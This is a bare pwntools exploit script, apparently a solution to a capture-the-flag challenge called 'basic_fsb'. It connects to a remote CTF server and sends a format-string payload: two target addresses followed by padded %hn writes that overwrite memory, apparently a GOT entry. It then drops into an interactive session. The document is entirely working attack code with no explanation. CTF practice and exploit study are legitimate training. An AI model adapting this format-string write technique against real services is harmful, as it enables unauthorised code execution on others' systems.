from pwn import *
import time

#p = process('./basic_fsb')
p = remote('ctf.j0n9hyun.xyz', 3002)
print(p.recv().decode())

payload = ''
payload += '\x0e\xa0\x04\x08' + '%2048c%hn   ' + '\x0c\xa0\x04\x08' + '%32169c%6$hn'
p.sendline(payload)
time.sleep(0.5)
p.interactive()
